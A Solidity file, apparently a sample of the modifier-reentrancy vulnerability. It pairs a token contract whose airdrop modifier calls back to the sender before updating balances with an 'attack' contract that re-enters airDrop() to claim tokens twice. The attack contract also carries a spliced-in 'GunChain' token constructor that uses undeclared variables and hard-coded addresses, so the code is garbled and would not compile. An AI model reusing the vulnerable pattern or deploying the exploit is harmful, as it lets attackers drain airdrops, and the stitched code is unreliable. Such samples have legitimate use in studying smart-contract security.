 

pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

   
   
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

   
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{  
    bool hasBeenCalled;

    function GunChain() public {
        totalSupply = 99000000000000000;
        name = 'GunChain';
        symbol = 'GCHAIN';
        decimals = 8;
        balanceOf[0xa0f236796BE660F1ad18F56b0Da91516882aE049] = totalSupply;
        Transfer(address(0), 0xa0f236796BE660F1ad18F56b0Da91516882aE049, totalSupply);

        airAmount = 100000000;
        airBegintime = 1532736000;
        airEndtime = 1532736300;
        airSender = 0xa0f236796BE660F1ad18F56b0Da91516882aE049;
        airLimitCount = 1;

        icoRatio = 10000000;
        icoBegintime = 1532736000;
        icoEndtime = 1538265540;
        icoSender = 0xA89d7a553Da4E313c7F77A1F7f16B9FACF538349;
        icoHolder = 0xA89d7a553Da4E313c7F77A1F7f16B9FACF538349;
    }

    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}
